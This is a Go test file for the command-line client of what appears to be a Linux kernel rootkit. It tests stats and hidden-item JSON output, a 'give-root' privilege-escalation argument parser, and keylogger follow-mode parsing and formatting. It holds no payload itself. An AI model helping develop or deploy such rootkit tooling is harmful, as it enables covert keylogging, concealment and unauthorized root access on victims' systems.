package main

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
)

// marshalStatsJSON owns the `stats --json` envelope: schema first-class,
// numeric values as numbers, the rest as strings.
func TestMarshalStatsJSON(t *testing.T) {
	raw := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.8",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	j, err := marshalStatsJSON(raw)
	if err != nil {
		t.Fatalf("marshalStatsJSON: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 {
		t.Errorf("schema = %v, want 1", out["schema"])
	}
	for _, k := range []string{"hooks_installed", "hooks_planned",
		"hidden_files", "hidden_pids", "hidden_ports",
		"keylog_bytes", "uptime_s", "module_hidden", "schema"} {
		if _, ok := out[k].(float64); !ok {
			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
		}
	}
	if out["module"] != "vault_kernel" || out["version"] != "3.8" {
		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
	}
}

// marshalHiddenJSON owns the `list --json` envelope: schema + the three
// sections, empty ones as [] (never null).
func TestMarshalHiddenJSON(t *testing.T) {
	hl := ioctl.HiddenList{
		PIDs:  []int{1234, 567},
		Files: []string{"secret.txt", "my dir/with space.txt"},
		Ports: []int{8080},
	}
	j, err := marshalHiddenJSON(hl)
	if err != nil {
		t.Fatalf("marshalHiddenJSON: %v", err)
	}
	var out struct {
		Schema int      `json:"schema"`
		PIDs   []int    `json:"pids"`
		Files  []string `json:"files"`
		Ports  []int    `json:"ports"`
	}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out.Schema != 1 {
		t.Errorf("schema = %d, want 1", out.Schema)
	}
	if len(out.PIDs) != 2 || out.PIDs[0] != 1234 || len(out.Files) != 2 ||
		out.Files[1] != "my dir/with space.txt" || len(out.Ports) != 1 {
		t.Errorf("sections mangled: %+v", out)
	}

	empty := ioctl.HiddenList{PIDs: []int{}, Files: []string{}, Ports: []int{}}
	je, err := marshalHiddenJSON(empty)
	if err != nil {
		t.Fatalf("marshalHiddenJSON(empty): %v", err)
	}
	if string(je) == "" || json.Valid(je) == false {
		t.Fatalf("empty envelope invalid: %s", je)
	}
	var outE map[string]interface{}
	json.Unmarshal(je, &outE)
	for _, k := range []string{"pids", "files", "ports"} {
		if arr, ok := outE[k].([]interface{}); !ok || len(arr) != 0 {
			t.Errorf("empty %s must marshal as [], got %v", k, outE[k])
		}
	}
}

// The doctor envelope always carries schema + client_version, and the
// v3.7 parity fix keeps device_open/stats_responds present (as false)
// when their check ran and failed — pointer fields, so they only
// disappear when the check never ran.
func TestDoctorJSONEnvelopeParity(t *testing.T) {
	openOK := false
	statsOK := false
	rep := doctorReport{
		Schema:        jsonSchemaVersion,
		ClientVersion: clientVersion,
		DevicePresent: true,
		DeviceOpen:    &openOK,
		StatsResponds: &statsOK,
		Warnings:      2,
	}
	j, err := json.MarshalIndent(&rep, "", "  ")
	if err != nil {
		t.Fatalf("marshal doctorReport: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 {
		t.Errorf("schema = %v, want 1", out["schema"])
	}
	if out["client_version"] != clientVersion {
		t.Errorf("client_version = %v, want %s", out["client_version"], clientVersion)
	}
	if b, ok := out["device_open"].(bool); !ok || b {
		t.Errorf("device_open must be present and false on failed open, got %v", out["device_open"])
	}
	if b, ok := out["stats_responds"].(bool); !ok || b {
		t.Errorf("stats_responds must be present and false on failed stats, got %v", out["stats_responds"])
	}
}

// parseGiveRootPID owns the give-root argument contract: no argument
// (or 0) = self (documented kernel contract, pid <= 0 escalates the
// caller), numeric PID passes through, NON-NUMERIC is a usage error —
// v3.8 parity fix: the discarded Atoi error used to turn
// `give-root abc` into a silent SELF escalation (the Python CLI
// rejects it via argparse type=int).
func TestParseGiveRootPID(t *testing.T) {
	// No argument → self (0).
	pid, err := parseGiveRootPID(nil)
	if err != nil || pid != 0 {
		t.Errorf("no args: got (%d, %v), want (0, nil)", pid, err)
	}
	// Numeric PID passes through, negatives included (pid <= 0 =
	// caller per the kernel contract).
	for _, tc := range []struct {
		in   string
		want int
	}{
		{"1234", 1234},
		{"1", 1},
		{"-5", -5},
		{"0", 0},
	} {
		pid, err := parseGiveRootPID([]string{tc.in})
		if err != nil || pid != tc.want {
			t.Errorf("parseGiveRootPID(%q) = (%d, %v), want (%d, nil)", tc.in, pid, err, tc.want)
		}
	}
	// Non-numeric → usage error, never a silent self-root.
	for _, bad := range []string{"abc", "12x", "1.5", ""} {
		pid, err := parseGiveRootPID([]string{bad})
		if err == nil {
			t.Errorf("parseGiveRootPID(%q) = (%d, nil), want error", bad, pid)
		}
		if pid != 0 {
			t.Errorf("parseGiveRootPID(%q) must not return a pid on error, got %d", bad, pid)
		}
	}
	// Extra positional args are rejected (strict grammar).
	if _, err := parseGiveRootPID([]string{"1", "2"}); err == nil {
		t.Errorf("extra args must be rejected, got nil error")
	}
}

// parseKeylogArgs owns the keylog grammar: keylog [--follow [ms]]
// [--timestamps].  The interval stays positional after --follow;
// --timestamps is accepted anywhere but only together with --follow.
// v3.8: before this parser existed, unknown args in the one-shot path
// were silently ignored (`keylog 500` behaved as `keylog`).
func TestParseKeylogArgs(t *testing.T) {
	// Bare keylog: one-shot, default interval.
	opts, err := parseKeylogArgs(nil)
	if err != nil || opts.follow || opts.timestamps || opts.intervalMs != keylogDefaultIntervalMs {
		t.Errorf("no args: got %+v, %v", opts, err)
	}
	// --follow alone: default interval.
	opts, err = parseKeylogArgs([]string{"--follow"})
	if err != nil || !opts.follow || opts.timestamps || opts.intervalMs != keylogDefaultIntervalMs {
		t.Errorf("--follow: got %+v, %v", opts, err)
	}
	// Positional interval after --follow.
	opts, err = parseKeylogArgs([]string{"--follow", "200"})
	if err != nil || !opts.follow || opts.intervalMs != 200 {
		t.Errorf("--follow 200: got %+v, %v", opts, err)
	}
	// --timestamps in any position, with --follow.
	for _, tc := range [][]string{
		{"--follow", "--timestamps"},
		{"--timestamps", "--follow"},
		{"--follow", "200", "--timestamps"},
	} {
		opts, err = parseKeylogArgs(tc)
		if err != nil || !opts.follow || !opts.timestamps {
			t.Errorf("%v: got %+v, %v", tc, opts, err)
		}
	}
	// --timestamps without --follow → usage error in both clients.
	if _, err := parseKeylogArgs([]string{"--timestamps"}); err == nil {
		t.Errorf("--timestamps without --follow must error")
	}
	// Interval below the 50 ms floor → error (unchanged contract).
	if _, err := parseKeylogArgs([]string{"--follow", "10"}); err == nil {
		t.Errorf("--follow 10 must error (min 50)")
	}
	// Non-numeric interval → error.
	if _, err := parseKeylogArgs([]string{"--follow", "abc"}); err == nil {
		t.Errorf("--follow abc must error")
	}
	// Unknown/stray args → usage error (was: silently ignored).
	if _, err := parseKeylogArgs([]string{"--bogus"}); err == nil {
		t.Errorf("unknown flag must error")
	}
	if _, err := parseKeylogArgs([]string{"500"}); err == nil {
		t.Errorf("positional interval without --follow must error")
	}
	if _, err := parseKeylogArgs([]string{"--follow", "200", "300"}); err == nil {
		t.Errorf("second positional interval must error")
	}
}

// formatKeylogEvent is the user-facing contract of one follow event,
// mirrored by format_keylog_event in the Python CLI: timestamps put
// every event on a fresh [HH:MM:SS]-prefixed line; without them a
// suffix diff continues the line and a wrap starts a new one.
func TestFormatKeylogEvent(t *testing.T) {
	// Continuation without timestamps: raw suffix, no newline.
	if got := formatKeylogEvent("def", "10:30:05", false, false); got != "def" {
		t.Errorf("continuation no-ts = %q, want %q", got, "def")
	}
	// Buffer wrap without timestamps: newline before the replay.
	if got := formatKeylogEvent("wrapped", "10:30:05", false, true); got != "\nwrapped" {
		t.Errorf("wrap no-ts = %q, want %q", got, "\nwrapped")
	}
	// With timestamps: BOTH cases start on a fresh [HH:MM:SS] line.
	if got := formatKeylogEvent("def", "10:30:05", true, false); got != "\n[10:30:05] def" {
		t.Errorf("continuation ts = %q, want %q", got, "\n[10:30:05] def")
	}
	if got := formatKeylogEvent("wrapped", "10:30:05", true, true); got != "\n[10:30:05] wrapped" {
		t.Errorf("wrap ts = %q, want %q", got, "\n[10:30:05] wrapped")
	}
	// Content is never mangled by the formatter.
	if got := formatKeylogEvent("my dir/with space.txt", "00:00:00", true, false); !strings.HasSuffix(got, "my dir/with space.txt") {
		t.Errorf("content mangled: %q", got)
	}
}
